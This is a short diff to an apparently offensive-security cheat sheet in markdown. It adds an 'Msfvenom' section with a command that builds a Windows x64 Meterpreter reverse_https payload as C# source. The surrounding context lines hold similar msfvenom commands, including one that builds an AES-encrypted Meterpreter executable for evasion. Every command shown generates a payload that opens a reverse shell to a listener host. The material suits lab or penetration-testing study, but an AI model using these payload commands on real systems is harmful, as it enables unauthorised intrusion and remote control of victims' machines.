@@ -37,3 +37,10 @@ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.9 LPORT
 msfvenom --list encrypt
 sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o met64_aes.exe
 ```
+
+#### Msfvenom
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.9 LPORT=4444 -f csharp -o test.cs
+```
+
+
